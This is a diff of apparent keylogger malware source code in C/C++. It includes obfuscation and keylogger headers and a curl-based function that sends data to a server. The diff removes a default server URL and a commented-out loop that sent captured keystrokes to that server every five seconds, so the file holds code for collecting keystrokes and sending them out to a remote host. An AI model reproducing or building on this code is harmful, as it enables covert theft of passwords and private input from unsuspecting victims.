@@ -18,9 +18,6 @@
 #include "Obfuscation.h"
 #include "Keylogger.h"
 
-#ifndef SERVER_URL
-#define SERVER_URL "http://default-server.com"
-#endif
 
 int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address) {
 	CURL* curl;
@@ -61,19 +58,3 @@ int sendIpv4ToServer(const char* serverUrl, const char* ipv4Address) {
 	curl_global_cleanup();
 	return 0;
 }
-
-
-//void sendToServerPeriodically(MemoryRegion* memRegion, const char* serverUrl) {
-	//while (true) {
-		//if (memRegion->used > 0) {  // Check if there are keystrokes to send
-			//if (!GenerateIpv4Output((unsigned char*)memRegion->baseAddress, memRegion->used, serverUrl)) {
-				//fprintf(stderr, "Failed to send keystrokes to the server.\n");
-		//	}
-			//else {
-				//printf("Keystrokes sent to the server.\n");
-			//}
-		//}
-		// Wait for 5 seconds before sending again
-		//std::this_thread::sleep_for(std::chrono::seconds(5));
-	//}
-//}
